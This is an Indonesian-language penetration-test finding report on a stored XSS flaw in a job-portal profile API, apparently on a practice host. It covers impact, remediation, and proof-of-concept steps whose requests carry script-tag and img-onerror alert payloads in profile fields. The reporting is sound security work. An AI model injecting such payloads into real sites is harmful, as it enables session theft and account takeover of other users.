# Finding 08: Stored Cross-Site Scripting (Stored XSS)

| Item | Detail |
|------|--------|
| **Kerentanan** | Stored Cross-Site Scripting (Stored XSS) |
| **Severity** | Medium |
| **Skor CVSS** | 6.1 (`CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N`) |
| **URL PoC** | `http://jobportal.vulnapp.id/profile/view?id=105` |
| **Endpoint** | `POST /api/profile/update` / `PUT /api/users/{id}/profile` (Field Profil) |

---

## Deskripsi

Kerentanan ini terjadi karena aplikasi menampilkan input pengguna ke halaman web tanpa sanitasi atau encoding di sisi server. Hal ini memungkinkan penyerang menyuntikkan skrip berbahaya (seperti JavaScript) yang akan dieksekusi oleh browser pengguna lain saat mengakses halaman tersebut.

---

## Dampak

- Penyerang dapat melakukan pencurian sesi dan pengambilalihan akun (Account Takeover) dengan mencuri *session cookie* atau token autentikasi milik korban untuk masuk ke dalam akun tanpa kata sandi.
- Penyerang dapat melakukan pencurian data dan perekaman aktivitas (Data Theft) untuk membaca informasi sensitif yang tampil di layar, merekam input formulir, serta mengarahkan pengguna ke situs penipuan (*phishing*).
- Penyerang dapat memicu tindakan tanpa izin atas nama korban (Unauthorized Actions) secara otomatis di dalam aplikasi.

---

## Rekomendasi Perbaikan

- Terapkan output encoding (seperti *HTML Entity Encoding*) pada semua data input pengguna sebelum ditampilkan ke layar agar dibaca sebagai teks biasa, bukan kode eksekutabel.
- Lakukan sanitasi input di sisi server menggunakan pustaka sanitasi terpercaya untuk membersihkan karakter atau tag HTML berbahaya.
- Atur atribut `HttpOnly` pada cookie sesi agar tidak dapat dibaca atau dicuri melalui skrip JavaScript.
- Pasang header Content Security Policy (CSP) pada server web untuk membatasi dan mengontrol skrip yang boleh dieksekusi.

---

## Langkah Proof of Concept (PoC)

### Langkah 1 — Menyisipkan payload XSS pada saat update profil

Mengirimkan request pembaruan profil dengan memasukkan payload JavaScript pada parameter input (seperti nama lengkap, bio, atau alamat).

**Request:**

```http
POST /api/profile/update HTTP/1.1
Host: jobportal.vulnapp.id
Authorization: Bearer <TOKEN_ATTACKER>
Content-Type: application/json

{
  "fullname": "Attacker <script>alert(document.cookie)</script>",
  "bio": "<img src=x onerror=alert('XSS-Stored-Executed')>",
  "address": "Jl. Testing No. 1"
}
```

> **Capture 1:** Intercept request update profil berisi payload Stored XSS

---

### Langkah 2 — Menyimpan perubahan profil dan memverifikasi simpanan data

Aplikasi merespons dengan status `200 OK` dan menyimpan payload XSS secara permanen di dalam database aplikasi (*Stored XSS*).

**Response:**

```json
{
  "status": "success",
  "message": "Profile updated successfully",
  "data": {
    "fullname": "Attacker <script>alert(document.cookie)</script>",
    "bio": "<img src=x onerror=alert('XSS-Stored-Executed')>"
  }
}
```

> **Capture 2:** Response sukses penyimpanan payload XSS di database aplikasi

---

### Langkah 3 — Mengakses halaman profil dan mengeksekusi skrip JavaScript di browser korban

Saat pengguna lain (atau admin) membuka halaman profil penyerang (`GET /profile/view?id=attacker`), aplikasi menampilkan isi data bio/fullname tanpa *output encoding*, menyebabkan skrip JavaScript langsung dieksekusi oleh browser korban.

```http
GET /profile/view?id=105 HTTP/1.1
Host: jobportal.vulnapp.id
```

**Hasil di Browser:**
Pop-up dialog `alert(document.cookie)` atau `alert('XSS-Stored-Executed')` muncul secara otomatis pada browser korban.

> **Capture 3:** Pop-up alert JavaScript tereksekusi pada browser korban
